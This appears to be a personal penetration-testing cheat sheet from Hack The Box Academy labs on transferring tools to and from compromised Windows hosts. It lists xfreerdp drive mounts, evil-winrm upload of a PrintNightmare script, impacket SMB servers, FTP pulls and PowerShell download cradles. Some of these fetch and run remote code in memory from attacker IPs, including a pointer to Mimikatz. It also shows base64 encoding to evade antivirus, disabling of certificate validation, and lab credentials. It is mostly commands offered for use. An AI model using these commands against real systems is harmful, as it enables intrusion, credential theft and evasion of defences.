#### with RDP
- using xfreerdp clipboard to upload files to victim
- using xfreerdp to mount a shared folder so you can exfiltrate
 ```
xfreerdp /v:10.129.43.33 /u:htb-student /p:"HTB_@cademy_stdnt!" /drive:share,/home/demise/tools/win

 copy \\tsclient\share\SharpHound.exe Sharphound.exe # COPY COMMAND
 ```
domain joined rdp:
```
xfreerdp  /u:hporter /p:'Gr8hambino!' /v:172.16.8.20 #was domain joined btw

xfreerdp /v:10.129.43.33 /u:'ad.someorg.local\htb-student' /p:"HTB_@cademy_stdnt!" /drive:share,/home/demise/tools/win
```
### using copy with xfreerdp
```
 copy \\tsclient\share\SharpHound.exe Sharphound.exe
 ls

    Directory: C:\Users\htb-student\Documents

-a----        9/18/2025   9:31 AM        1311232 Sharphound.exe
```

### using evil-winrm
- using evil-winrm to upload files to victim while in session1
```
*Evil-WinRM* PS C:\programdata> upload /opt/i/CVE-2021-1675.ps1
```
4.  **Download with Custom User-Agent**

    ```powershell
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
    ```

---
## SMB Downloads


`start an smb server (attacker)`
```shell-session
sudo impacket-smbserver share -smb2support $(pwd) -u realm -password fckswe
```

authenticate to smb server 
```
PS C:\Users\Public\Music> net use \\10.10.16.11\share /user:realm fckswe  
The command completed successfully.  
```

`copy files from attacker server`
```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe
```

New versions of Windows block unauthenticated guest access so  that a windows host cant anonymously access any sort of share,  create a secure smb channel on your attacking rig:

`Start an SMB Server with creds #attacker`
```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

`accesss smb share #victim (mounting maybe)`
```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test
```

---
### download using powershell
`webclient`

```powershell

# Using iwr
IEX(iwr -Uri http://10.10.16.5:8080/mag.ps1 -UseBasicParsing)

# save to disk dont execute with usebasicparsing:
Invoke-WebRequest -Uri http://10.10.16.5:8080/mag.ps1 -UseBasicParsing -OutFile mag.ps1
# without usebasicparsing
Invoke-WebRequest -Uri http://10.10.16.5:8080/mag.ps1 -OutFile mag.ps1

#  in memmory via net.webclient
IEX((New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>'))

# save to disk, dont execute: 
(New-Object Net.WebClient).DownloadFile('http://10.10.16.19:80/backup.exe','backup.exe')
```

`using invoke-webRequest`
```
Invoke-WebRequest -Uri http://10.10.16.5:8080/mag.ps1 -OutFile mag.ps1
```

confirm file exists after download:
`finding files via type *.ps1 `
```
Get-ChildItem -Recurse | Where-Object { $_.Name -like '*.ps1' }
```

 `IEX (file-less execution after download) or Invoke-Expression with DownloadString`
```
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.19/backup.exe') 
```

`pipe downloadString to IEX #2`  try `invoke-mimikatz.ps1 from empire`
```
(New-ObjectNet.WebClient).DownloadString('link') | IEX
```

`Invoke web request:`
You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.
```powershell-session

wget http://172.16.8.120:1337/Winpeas.exe -outfile winpeas.exe

 Invoke-WebRequest http://172.16.8.120:1337/PowerView.ps1 -OutFile PowerView.ps1 -UseBasicParsing
```

---
## Clipboard transfer

`integriti checks`
```shell-session
md5sum id_rsa
```


`base64 encoding to bypass simple AV/IPS rules`
```shell-session
attacker$ cat <clipboardcontent> |base64 -w 0;echo
```

`Decode File & store somewhere`
```powershell-session

[IO.File]::WriteAllBytes("#location-to-write",[Convert]::FromBase64String("#base64-string"))
```

`confirm md5sum:`
```powershell-session
Get-FileHash <PATH> -Algorithm md5
```
**Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility `(cmd.exe)` has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

---
## download via FTP 
-----------------------
```shell-session
sudo pip3 install pyftpdlib
```

`start ftp server`
```shell-session
sudo python3 -m pyftpdlib --port 21
```

 `PowerShell, download from an ftp server`
```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', '<locationtowrite')
```

`creating command file for ftp client #victim`
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```


### more techniques:`
```
more transfer methods from harmjoy:
https://gist.github.com/HarmJ0y/bb48307ffa663256e239
```


| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |


`search for WMI commands with astrik reg`
```
Get-Command -Noun WMI*
```


 powershell issues:
```
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`.
```

- Certificate SSL Not Trusted
```powershell-session
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

```

`using PowerShell DownloadFile Method:`
```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('#url')
```